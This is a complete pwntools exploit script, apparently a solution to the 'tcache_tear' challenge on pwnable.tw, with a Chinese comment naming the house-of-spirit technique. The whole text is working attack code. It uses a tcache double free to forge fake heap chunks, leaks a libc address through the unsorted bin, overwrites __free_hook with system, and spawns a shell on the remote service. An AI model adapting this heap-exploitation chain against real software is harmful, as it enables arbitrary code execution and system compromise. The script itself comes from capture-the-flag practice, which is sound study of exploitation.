#house of spirit，构造fake chunk > 0x408 free后进入unsorted bin
from pwn import *
context.log_level = 'debug'
prog = './tcache_tear'
elf = ELF(prog)
p = process(prog)#,env={"LD_PRELOAD":"./libc.so"})
libc = ELF("./libc.so")
p = remote("chall.pwnable.tw", 10207)

def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
    	
def add(size, content):
	p.sendlineafter("choice :", '1')
	p.sendlineafter("Size:", str(size))
	p.sendlineafter("Data:", content)

def free():
	p.sendlineafter("choice :", '2')

def exp():
	stdout = 0x602020
	payload = p64(0)+p64(0x501)
	p.sendlineafter("Name:", payload)
	
	add(0x80, 'a')
	free()
	free()
	add(0x80, p64(0x602560))
	add(0x80, 'a')
	add(0x80, p64(0)+p64(0x31)+p64(0)*5+p64(0x21))
	add(0x30, 'a')
	free()
	free()
	add(0x30, p64(0x602070))
	add(0x30, 'a')
	add(0x30, 'a')
	free()
	p.sendlineafter("choice :", '3')
	libc.address = u64(p.recvuntil("\x7f")[-6:]+'\x00'*2)-0x7f4ad90ddca0+0x7f4ad8cf2000
	log.info("libc.address ==> " + hex(libc.address))
	free_hook = libc.sym['__free_hook']
	system = libc.sym['system']
	add(0x40, 'a')
	free()
	free()
	add(0x40, p64(free_hook))
	add(0x40, 'a')
	add(0x40, p64(system))
	add(0x50, '/bin/sh\x00')
	free()
	#dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
